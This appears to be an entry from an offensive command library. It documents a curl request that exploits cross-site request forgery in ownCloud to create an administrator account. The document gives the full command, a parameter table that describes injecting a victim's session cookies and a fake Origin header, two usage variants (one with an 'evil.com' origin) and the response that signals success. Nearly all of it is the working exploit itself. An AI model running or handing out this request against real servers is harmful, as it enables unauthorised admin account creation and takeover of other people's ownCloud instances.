---
id: cmd-curl-csrf-user-create
data: >-
  curl 'http://localhost:8080/settings/users/users' -H 'Accept: */*' -H
  'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded;
  charset=UTF-8' -H 'Cookie: oc_sessionPassphrase=<placeholder1>;
  oclt1tejv3yd=<placeholder2>' -H 'Origin: http://abc:8080' --data-raw
  'username=new_admin&groups%5B%5D=admin&password=a&email=test%40mail.com'
  --compressed
tags:
  - csrf
  - curl
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.716Z'
verified: false
validated: true
submitted: true
---
# curl-owncloud-csrf-user-creation

## Command

```bash
curl 'http://localhost:8080/settings/users/users' -H 'Accept: */*' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: oc_sessionPassphrase=<placeholder1>; oclt1tejv3yd=<placeholder2>' -H 'Origin: http://abc:8080' --data-raw 'username=new_admin&groups%5B%5D=admin&password=a&email=test%40mail.com' --compressed
```

## Description

This command sends a forged POST request to ownCloud's user creation endpoint, exploiting CSRF by omitting the requesttoken and using victim cookies to add a new admin user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL ('http://localhost:8080/settings/users/users') | Target endpoint for user management | Yes |
| -H 'Accept: */*' | Accepts any response type | Yes |
| -H 'Connection: keep-alive' | Maintains persistent connection | Yes |
| -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' | Specifies form-encoded data | Yes |
| -H 'Cookie: ...' | Injects victim's session cookies | Yes |
| -H 'Origin: http://abc:8080' | Fake origin to simulate cross-site request | Yes |
| --data-raw '...' | Form data for user creation | Yes |
| --compressed | Enables response compression | No |

## Examples

### Basic Usage

```bash
curl 'http://localhost:8080/settings/users/users' -H 'Cookie: oc_sessionPassphrase=PK123; oclt1tejv3yd=ABC456' -H 'Origin: http://evil.com' --data-raw 'username=new_admin&groups%5B%5D=admin&password=a&email=test@mail.com'
```

### Advanced Usage

```bash
curl -v 'http://localhost:8080/settings/users/users' -H 'Cookie: oc_sessionPassphrase=PK123; oclt1tejv3yd=ABC456' -H 'Origin: http://abc:8080' --data-raw 'username=new_admin&groups%5B%5D=admin&password=a&email=test%40mail.com' --compressed
```

## Expected Output

Successful response such as HTTP/1.1 200 OK with JSON {"ocs":{"meta":{"status":"ok"}}} or a redirect, indicating user creation without CSRF errors.

## Related

- [[procedures/exploit-csrf-create-admin-user]]
